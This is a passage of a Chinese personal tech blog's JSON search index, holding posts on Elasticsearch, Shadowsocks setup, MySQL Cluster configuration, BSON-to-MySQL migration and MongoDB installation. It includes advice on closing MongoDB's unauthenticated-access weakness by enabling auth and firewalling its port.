helpers.bulk(es, actions)</span><br><span class=\"line\">        <span class=\"keyword\">del</span> actions[<span class=\"number\">0</span>:len(actions)]</span><br></pre></td></tr></table></figure></p>\n<p>【参考文章】</p>\n<ul>\n<li><a href=\"http://www.justinablog.com/archives/967\" target=\"_blank\" rel=\"external\">使用Python进行Elasticsearch数据索引</a></li>\n<li><a href=\"http://chenlinux.com/2015/02/11/python-elasticsearch-bulk/\" target=\"_blank\" rel=\"external\">Python 批量写入 Elasticsearch 脚本</a></li>\n</ul>\n"},{"title":"我与Shadowsocks","url":"http://ohroot.com/2015/04/16/我与Shadowsocks/","content":"<p>之前一直采用Goagent应对GFW问题，这几日发现实在卡的不得了，有些链接都打不开了，于是就看下有没有啥好的替换方案，就去看了下Shadowsocks，发现使用起来还是非常简单方便的。<br><a id=\"more\"></a></p>\n<h2 id=\"资源链接\">资源链接</h2><ol>\n<li><a href=\"https://github.com/shadowsocks/shadowsocks\" target=\"_blank\" rel=\"external\">Shadowsocks的Github地址</a>,这里有简单的使用说明</li>\n<li><a href=\"http://sourceforge.net/projects/shadowsocksgui/files/dist/\" target=\"_blank\" rel=\"external\">Windows客户端下载地址</a>，可根据<a href=\"https://github.com/shadowsocks/shadowsocks-csharp\" target=\"_blank\" rel=\"external\">Github上该软件的说明</a>来下载对应的版本</li>\n<li>免费的<a href=\"http://www.hidess.com/shadowsocks/\" target=\"_blank\" rel=\"external\">服务端信息</a>，这个网站有提供免费的服务端</li>\n</ol>\n<h2 id=\"安装使用\">安装使用</h2><h3 id=\"window平台\">window平台</h3><p>直接下载对应版本的软件，双击执行就可以了，你的设备需要使用系统代理，我发现Shadowsocks还会有PAC，用过Goagent的人一定会觉得这两货功能还挺像</p>\n<h3 id=\"Linux平台\">Linux平台</h3><p>我用的是Ubuntu，所以我只记录下Ubuntu下的安装使用，其他的或许以后用到再更新吧。<br>好像有好多种方法可以使用，我就选择了安装有图形界面的，不是很习惯每次启动都要敲命令，Qt5版的安装方法如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo add-apt-repository ppa:hzwhuang/ss-qt5</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install shadowsocks-qt5</span><br></pre></td></tr></table></figure>"},{"title":"ubuntu14.04下修复flash版本问题","url":"http://ohroot.com/2015/03/15/ubuntu14-04下修复flash版本问题/","content":"<a id=\"more\"></a>\n<p>之前一直用低版本的chrome下flash插件，今天听虾米音乐听不了，必须要解决下了。解决办法如下：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-get install pepperflashplugin-nonfree</span><br><span class=\"line\">sudo update-pepperflashplugin-nonfree --install</span><br></pre></td></tr></table></figure>"},{"title":"从BSON文件到MySQL","url":"http://ohroot.com/2015/03/12/从BSON文件到MySQL/","content":"<p>我们获取到了一个BSON的数据文件，怎么将其导入到MySQL中呢，下面开始探索<br><a id=\"more\"></a><br>Google下发现其为Mongodb的一种数据格式，然后便安装mongodb。解决思路。将数据恢复到mongodb，然后将数据导出成mysql可接受的格式，即CSV格式，然后导入到Mysql</p>\n<h2 id=\"mongodbexport工具使用\">mongodbexport工具使用</h2><p>mongoexport参数说明：<br>-h:指明数据库宿主机的IP<br>-u:指明数据库的用户名<br>-p:指明数据库的密码<br>-d:指明数据库的名字<br>-c:指明collection的名字<br>-f:指明要导出那些列<br>-o:指明到要导出的文件名<br>-q:指明导出数据的过滤条件</p>\n<h3 id=\"数据导入mongodb\">数据导入mongodb</h3><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mongorestore <span class=\"operator\">-d</span> mydb ~/data/data.bson    <span class=\"comment\">#tank这个数据库的备份路径</span></span><br><span class=\"line\">$ mongo</span><br><span class=\"line\">&gt;show dbs         <span class=\"comment\">#查看数据库</span></span><br><span class=\"line\">&gt;use dbname     <span class=\"comment\">#选择一个数据库</span></span><br><span class=\"line\">&gt;db.tablename.find()    <span class=\"comment\">#查看一个表的十条数据</span></span><br><span class=\"line\">&gt;db.tablename.findOne()    <span class=\"comment\">#查看一个表的一条数据，此命令可用于查询表“结构”</span></span><br><span class=\"line\">&gt;db.dropDatabase()      <span class=\"comment\">#数据导出完成后，删除数据库</span></span><br></pre></td></tr></table></figure>\n<h2 id=\"mongodb导入到mysql\">mongodb导入到mysql</h2><p><code>mongoexport -h 127.0.0.1 -d dbname -c tablename -f ziduan1,ziduan2 --type=csv -o webdata.csv</code><br>或<br><code>mongoexport -d dbname -c user -o user.dat</code><br><figure class=\"highlight sql\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">$ mysql -u root -p</span><br><span class=\"line\"><span class=\"operator\"><span class=\"keyword\">use</span> db;</span></span><br><span class=\"line\"><span class=\"operator\"><span class=\"keyword\">create</span> <span class=\"keyword\">table</span> ....;</span></span><br><span class=\"line\"><span class=\"operator\"><span class=\"keyword\">LOAD</span> <span class=\"keyword\">DATA</span> <span class=\"keyword\">INFILE</span> <span class=\"string\">'~/data/webdata.csv'</span> <span class=\"keyword\">INTO</span> <span class=\"keyword\">TABLE</span> webhost;</span></span><br></pre></td></tr></table></figure></p>\n"},{"title":"MySQL Cluster搭建","url":"http://ohroot.com/2015/03/11/MySQL-Cluster搭建/","content":"<p>配置了下MySQL Cluster，留下一点笔记<br><a id=\"more\"></a></p>\n<p>首先下载<a href=\"http://dev.mysql.com/downloads/cluster/\" target=\"_blank\" rel=\"external\">mysql-cluster</a>,直接安装.</p>\n<h2 id=\"安装SQL节点\">安装SQL节点</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># groupadd mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># useradd -r -g mysql mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># cd /usr/local/</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> <span class=\"built_in\">local</span>]<span class=\"comment\"># ln -s /opt/mysql/server-5.6 mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> <span class=\"built_in\">local</span>]<span class=\"comment\"># cd mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># chown -R mysql .</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># chgrp -R mysql .</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># mkdir /data/mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># chown -R mysql.mysql /data/mysql/</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># \\cp support-files/my-large.cnf /etc/my.cnf </span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># /usr/local/mysql/scripts/mysql_install_db --user=mysql --datadir=/data/mysql/ --basedir=/usr/local/mysql # 这一步会出现错误,则apt-get install libaio1 libaio-dev</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># chown -R root .</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># cp support-files/mysql.server /etc/init.d/mysqld</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># chmod 755 /etc/init.d/mysqld </span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># echo \"export PATH=$PATH:/usr/local/mysql/bin\" &gt;&gt; /root/.bash_profile    #添加环境变量，执1命令方便一点</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> mysql]<span class=\"comment\"># source /root/.bash_profile</span></span><br></pre></td></tr></table></figure>\n<p>​<br>修改/etc/my.cnf配置文件，追加如下配置<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\">datadir=/data/mysql</span><br><span class=\"line\">basedir= /usr/<span class=\"built_in\">local</span>/mysql</span><br><span class=\"line\">ndbcluster                         <span class=\"comment\"># 运行NDB存储引擎</span></span><br><span class=\"line\">ndb-connectstring=<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span>     <span class=\"comment\"># 管理节点</span></span><br><span class=\"line\">[MYSQL_CLUSTER]</span><br><span class=\"line\">ndb-connectstring=<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span>     <span class=\"comment\">#管理节点</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"安装NDB节点\">安装NDB节点</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> ~]<span class=\"comment\"># groupadd mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> ~]<span class=\"comment\"># useradd -r -g mysql mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> ~]<span class=\"comment\"># cd /usr/local/</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> <span class=\"built_in\">local</span>]<span class=\"comment\"># ln -s /opt/mysql/server-5.6 mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> <span class=\"built_in\">local</span>]<span class=\"comment\"># cd mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># chown -R mysql .</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># chgrp -R mysql .</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># mkdir /data/mysql</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># chown -R mysql.mysql /data/mysql/</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># /usr/local/mysql/scripts/mysql_install_db --user=mysql --datadir=/data/mysql/ --basedir=/usr/local/mysql </span></span><br><span class=\"line\"> 这一步会出现错误,则apt-get install libaio1 libaio-dev</span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># chown -R root .</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># \\cp support-files/my-large.cnf /etc/my.cnf </span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># cp support-files/mysql.server /etc/init.d/mysqld</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># chmod 755 /etc/init.d/mysqld </span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># echo \"export PATH=$PATH:/usr/local/mysql/bin\" &gt;&gt; /root/.bash_profile</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.2</span> mysql]<span class=\"comment\"># source /root/.bash_profile</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight haskell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"number\">192.168</span><span class=\"number\">.0</span><span class=\"number\">.2</span> mysql]# mkdir /<span class=\"typedef\"><span class=\"keyword\">data</span>/mysql-cluster/<span class=\"keyword\">data</span> -p</span></span><br></pre></td></tr></table></figure>\n<p>上面这个目录用来存放NDB节点的数据，在管理节点里面也要配置为该目录，配置其他的目录会报错，说无法创建各种日志文件。上面提到的/data/mysql是用来在没使用NDB时存放的数据，和平时我们使用的mysql没有区别。</p>\n<p>和SQL节点是一样的，修改/etc/my.cnf，追加如下内容：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[mysqld]</span><br><span class=\"line\">datadir=/data/mysql</span><br><span class=\"line\">basedir= /usr/<span class=\"built_in\">local</span>/mysql</span><br><span class=\"line\">ndbcluster                         <span class=\"comment\"># 运行NDB存储引擎</span></span><br><span class=\"line\">ndb-connectstring=<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span>     <span class=\"comment\"># 管理节点</span></span><br><span class=\"line\">[MYSQL_CLUSTER]</span><br><span class=\"line\">ndb-connectstring=<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span>     <span class=\"comment\">#管理节点</span></span><br></pre></td></tr></table></figure></p>\n<h2 id=\"安装管理节点\">安装管理节点</h2><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># mkdir /usr/local/mysql/bin -p                                      </span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># scp 192.168.0.2:/usr/local/mysql/bin/ndb_mgm /usr/local/mysql/bin/</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># scp 192.168.0.2:/usr/local/mysql/bin/ndb_mgmd /usr/local/mysql/bin/</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># echo \"export PATH=$PATH:/usr/local/mysql/bin\" &gt;&gt; /root/.bash_profile</span></span><br><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># source /root/.bash_profile</span></span><br></pre></td></tr></table></figure>\n<p>我配置的管理节点和SQL节点在同一台机器上，所以上面的步骤不需要</p>\n<ol>\n<li><p>在/data/创建目录mysql-cluster，该目录会存放相关日志文件，以及pid号。并在目录中创建配置文件config.ini</p>\n<figure class=\"highlight avrasm\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root<span class=\"localvars\">@192</span><span class=\"number\">.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span> ~]<span class=\"preprocessor\"># mkdir /data/mysql-cluster</span></span><br><span class=\"line\">[root<span class=\"localvars\">@192</span><span class=\"number\">.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span> ~]<span class=\"preprocessor\"># cd /data/mysql-cluster/</span></span><br><span class=\"line\">[root<span class=\"localvars\">@192</span><span class=\"number\">.168</span><span class=\"number\">.0</span><span class=\"number\">.1</span> mysql-cluster]<span class=\"preprocessor\"># touch config.ini</span></span><br></pre></td></tr></table></figure>\n</li>\n<li><p>config.ini文件配置如下</p>\n<figure class=\"highlight nix\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">[root@<span class=\"number\">192.168</span>.<span class=\"number\">0.1</span> ~]<span class=\"comment\"># cat /data/mysql-cluster/config.ini </span></span><br><span class=\"line\">[NDBD DEFAULT]</span><br><span class=\"line\"><span class=\"variable\">NoOfReplicas=</span><span class=\"number\">1</span>                        <span class=\"comment\">#每个数据节点的镜像数量，通常最低设置为2，否则就没有意义了，这里是方便后面测试。</span></span><br><span class=\"line\"><span class=\"variable\">DataMemory=</span><span class=\"number\">64</span>M                        <span class=\"comment\">#每个数据节点中给数据分配的内存</span></span><br><span class=\"line\"><span class=\"variable\">IndexMemory=</span><span class=\"number\">16</span>M                       <span class=\"comment\">#每个数据节点中给索引分配的内存</span></span><br><span class=\"line\"><span class=\"comment\">#管理节点</span></span><br><span class=\"line\">[NDB_MGMD]</span><br><span class=\"line\"><span class=\"variable\">nodeid=</span><span class=\"number\">1</span></span><br><span class=\"line\"><span class=\"variable\">hostname=</span><span class=\"number\">192.168</span>.<span class=\"number\">0.1</span>                 <span class=\"comment\">#管理节点ip</span></span><br><span class=\"line\"><span class=\"variable\">datadir=</span>/data/mysql-cluster           <span class=\"comment\">#管理节点数据目录,存放相关日志，以及pid文件</span></span><br><span class=\"line\"><span class=\"comment\">#第一个 ndbd 节点:</span></span><br><span class=\"line\">[NDBD]</span><br><span class=\"line\"><span class=\"variable\">nodeid=</span><span class=\"number\">2</span></span><br><span class=\"line\"><span class=\"variable\">hostname=</span><span class=\"number\">192.168</span>.<span class=\"number\">0.2</span>                 <span class=\"comment\">#数据节点ip地址</span></span><br><span class=\"line\"><span class=\"variable\">datadir=</span>/data/mysql-cluster/data</span><br><span class=\"line\"><span class=\"comment\">#第二个 ndbd 节点:</span></span><br><span class=\"line\">[NDBD]</span><br><span class=\"line\"><span class=\"variable\">nodeid=</span><span class=\"number\">3</span></span><br><span class=\"line\"><span class=\"variable\">hostname=</span><span class=\"number\">192.168</span>.<span class=\"number\">0.3</span></span><br><span class=\"line\"><span class=\"variable\">datadir=</span>/data/mysql-cluster/data     <span class=\"comment\">#NDB点数据存放目录</span></span><br><span class=\"line\"><span class=\"comment\"># SQL node options:</span></span><br><span class=\"line\">[MySQLD]</span><br><span class=\"line\"><span class=\"variable\">nodeid=</span><span class=\"number\">4</span></span><br><span class=\"line\"><span class=\"variable\">hostname=</span><span class=\"number\">192.168</span>.<span class=\"number\">0.5</span>                <span class=\"comment\">#SQL节点ip地址</span></span><br><span class=\"line\">[MySQLD]</span><br><span class=\"line\"><span class=\"variable\">nodeid=</span><span class=\"number\">5</span></span><br><span class=\"line\"><span class=\"variable\">hostname=</span><span class=\"number\">192.168</span>.<span class=\"number\">0.6</span></span><br><span class=\"line\">[MySQLD]                         <span class=\"comment\">#这里保留了一个空节点。否则停止NDB会报错：No free node id found for ndbd(NDB).</span></span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n<p>[NDB_MGMD] 表示管理节点的配置，只能有一个。<br>[NDBD DEFAULT] 表示每个数据节点的默认配置，在每个节点的[NDBD]中不用再写这些选项，只能有一个。<br>[NDBD] 表示每个数据节点的配置，可以有多个。<br>[MYSQLD] 表示SQL节点的配置，可以有多个，分别写上不同的SQL节点的ip地址；也可以不用写，只保留一个空节点，表示任意一个ip地址都可以进行访问。此节点的个数表明了可以用来连接数据节点的SQL节点总数。</p>\n<h2 id=\"使用cluster\">使用cluster</h2><p>启动顺序为：管理节点-&gt;数据节点-&gt;SQL节点</p>\n<ol>\n<li>启动管理节点：<code>ndb_mgmd -f /data/mysql-cluster/config.ini</code></li>\n<li>启动NDB（数据节点）:<code>ndbd --initial</code><br><strong>注意：只是在第一次启动或在备份/恢复或配置变化后重启ndbd时，才加–initial参数！原因在于，该参数会使节点删除由早期ndbd实例创建的，用于恢复的任何文件，包括用于恢复的日志文件。</strong></li>\n<li>启动SQL节点（启动mysql服务）:<code>/etc/init.d/mysqld start</code></li>\n</ol>\n<h2 id=\"MySQL_Cluster集群的关闭\">MySQL Cluster集群的关闭</h2><p>关闭顺序：SQL节点-&gt;数据节点-&gt;管理节点</p>\n<ol>\n<li>SQL节点关闭:<code>/etc/init.d/mysqld stop</code></li>\n<li>（NDB）数据节点关闭:<code>ndbd stop</code></li>\n<li>管理节点关闭<figure class=\"highlight perl\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ndb_mgm&gt; <span class=\"keyword\">shutdown</span></span><br><span class=\"line\">Node <span class=\"number\">2</span>: Cluster <span class=\"keyword\">shutdown</span> initiated</span><br><span class=\"line\">Node <span class=\"number\">3</span>: Cluster <span class=\"keyword\">shutdown</span> initiated</span><br><span class=\"line\"><span class=\"number\">3</span> NDB Cluster node(<span class=\"keyword\">s</span>) have <span class=\"keyword\">shutdown</span>.</span><br><span class=\"line\">Disconnecting to allow management server to <span class=\"keyword\">shutdown</span>.</span><br><span class=\"line\">Node <span class=\"number\">3</span>: Node <span class=\"keyword\">shutdown</span> completed.</span><br></pre></td></tr></table></figure>\n</li>\n</ol>\n"},{"title":"Mongodb取消开机自启动","url":"http://ohroot.com/2015/03/11/Mongodb取消开机自启动/","content":"<a id=\"more\"></a>\n<p>Ubuntu下安装的Mongodb默认开机自启动，在自己的开发环境下很不喜欢这样，这里给出取消开机自启动的方法</p>\n<h2 id=\"配置方法\">配置方法</h2><p>修改配置文件：<code>vim /etc/init/mongod.conf</code>，因为Ubuntu默认启动工作在runlevel2，则将配置文件中：<br><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">start</span> <span class=\"literal\">on</span> runlevel<span class=\"sqbracket\"> [2345]</span></span><br><span class=\"line\"><span class=\"keyword\">stop</span> <span class=\"literal\">on</span> runlevel<span class=\"sqbracket\"> [06]</span></span><br></pre></td></tr></table></figure></p>\n<p>改成<br><figure class=\"highlight apache\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">start</span> <span class=\"literal\">on</span> runlevel<span class=\"sqbracket\"> [345]</span></span><br><span class=\"line\"><span class=\"keyword\">stop</span> <span class=\"literal\">on</span> runlevel<span class=\"sqbracket\"> [026]</span></span><br></pre></td></tr></table></figure></p>\n<p>mysql取消开机自启动的方法也是类似的。</p>\n"},{"title":"Mongodb安装笔记","url":"http://ohroot.com/2015/03/11/Mongodb安装笔记/","content":"<p>Mongodb初探<br><a id=\"more\"></a><br>本文主要讲述ubuntu下安装Mongodb的简明教程</p>\n<h2 id=\"安装Mongodb\">安装Mongodb</h2><p>执行命令：<br><figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">sudo apt-key adv --keyserver hkp://keyserver.ubuntu.com:<span class=\"number\">80</span> --recv <span class=\"number\">7</span>F0CEB10</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">\"deb http://repo.mongodb.org/apt/ubuntu \"</span>$(lsb_release -sc)<span class=\"string\">\"/mongodb-org/3.0 multiverse\"</span> | sudo tee /etc/apt/sources.list.d/mongodb-org-<span class=\"number\">3.0</span>.list</span><br><span class=\"line\">sudo apt-get update</span><br><span class=\"line\">sudo apt-get install -y mongodb-org</span><br></pre></td></tr></table></figure></p>\n<h2 id=\"简单使用\">简单使用</h2><p>MongoDB默认数据存储位置：<code>/var/lib/mongodb</code>，日志文件存储位置：<code>/var/log/mongodb</code>，配置文件位置：<code>/etc/mongod.conf</code>，可在配置文件中修改数据存储位置和日志文件存储位置。MongoDB默认的端口号为：27017。</p>\n<ul>\n<li>启用mongodb：<code>sudo service mongod start</code></li>\n<li>停用mongodb：<code>sudo service mongod stop</code></li>\n<li>重启mongodb：<code>sudo service mongod restart</code></li>\n</ul>\n<h2 id=\"MongoDB_的未授权访问漏洞\">MongoDB 的未授权访问漏洞</h2><p>未授权访问漏洞成因：Mongodb 在启动的时候提供了很多参数，如日志记录到哪个文件夹，是否开启认证等。造成未授权访问的根本原因就在于启动Mongodb的时候未设置 —auth 也很少会有人会给数据库添加上账号密码（默认空口令，它像一张白纸，需要管理员自己去涂写账号)，使用默认空口令这将导致任何人无需进行账号认证就可以登陆到数据服务器。</p>\n<h3 id=\"解决方法\">解决方法</h3><ul>\n<li>使用 iptables 控制端口 27017 (默认端口) 的访问;</li>\n<li>auth 模式下运行 mongodb;</li>\n</ul>\n<h4 id=\"开启_MongoDB授权\">开启 MongoDB授权</h4><ol>\n<li><p>添加一个管理员用户</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">&gt; use admin</span><br><span class=\"line\">&gt; db.createUser( </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">    user: <span class=\"string\">\"root\"</span>, </span><br><span class=\"line\">    <span class=\"built_in\">pwd</span>: <span class=\"string\">\"YOUR PASSWORD\"</span>, </span><br><span class=\"line\">    roles: </span><br><span class=\"line\">    [ </span><br><span class=\"line\">      &#123; </span><br><span class=\"line\">        role: <span class=\"string\">\"userAdminAnyDatabase\"</span>, </span><br><span class=\"line\">        db: <span class=\"string\">\"admin\"</span> </span><br><span class=\"line\">      &#125; </span><br><span class=\"line\">    ] </span><br><span class=\"line\">  &#125; </span><br><span class=\"line\">)</span><br></pre></td></tr></table></figure>\n</li>\n<li><p>授权模式下运行 mongod</p>\n</li>\n</ol>\n<ul>\n<li><p>先停止服务:<code>$ sudo service mongod stop</code>。</p>\n</li>\n<li><p>编辑<code>/etc/mongod.conf</code>文件, 找到 <code>#auth=true</code> , 去掉注释。</p>\n</li>\n<li><p>重新运行服务:<code>$ sudo service mongod start</code>。</p>\n</li>\n<li><p>登录：<code>mongo admin -u 用户名 -p  密码 --port 端口号</code>。</p>\n</li>\n</ul>\n"},{"title":"dnspod动态域名解析","url":"http://ohroot.com/2015/03/11/dnspod动态域名解析/","content":"<p>dnspod动态域名解析，write up.<br><a id=\"more\"></a><br>添加DNSPOD记录</p>\n<p><a href=\"www.dnspod.cn/docs/index.html\">api文档https</a><br><a href=\"https://gist.github.com/chuangbo/833369\" target=\"_blank\" rel=\"external\">动态解析demo</a></p>\n<p>获得domain_id可以用curl<br><code>curl -k 